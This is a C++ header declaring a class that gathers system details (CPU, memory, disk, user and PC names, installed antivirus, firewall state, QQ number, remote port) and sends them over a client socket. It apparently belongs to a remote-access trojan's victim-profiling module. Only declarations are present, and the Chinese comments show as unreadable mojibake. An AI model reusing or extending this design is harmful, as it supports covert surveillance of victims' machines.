// GetSystemInfo.h: interface for the CGetSystemInfo class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_GETSYSTEMINFO_H__AEAC9DF9_93F0_4FFC_A9B4_0E1AAC9B69F1__INCLUDED_)
#define AFX_GETSYSTEMINFO_H__AEAC9DF9_93F0_4FFC_A9B4_0E1AAC9B69F1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"

//��Ϣ�б�ṹ��
struct tagSystemInfo
{
	char szCpuInfo[50];   //CPU��Ϣ
	char szActiveTime[50]; //�ʱ��
	char szAntiVirus[50]; //ɱ�����
	char szUserName[30];   //��ǰ�û���
	char szPcName[30];  //�������
	char szRemotePort[10]; //Զ�̶˿�
	DWORD szMemory;         //�ڴ��С 
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveSize;      //Ӳ�̴�С
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	char szOpenInfo[20];	// �Ƿ�˫��(�Ƿ���)
	char szDLLPath[128];    // �����·��
	char szScrxy[20];
	char szQQNum[100];
	char szLocalTime[50];
	BOOL bSysFirewall;
	WCHAR lpLCData[32];
};

class CGetSystemInfo  : public CManager  
{
public:
	CGetSystemInfo(CClientSocket *pClient);
	virtual ~CGetSystemInfo();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	void SendSysInfoList();
};

#endif // !defined(AFX_GETSYSTEMINFO_H__AEAC9DF9_93F0_4FFC_A9B4_0E1AAC9B69F1__INCLUDED_)
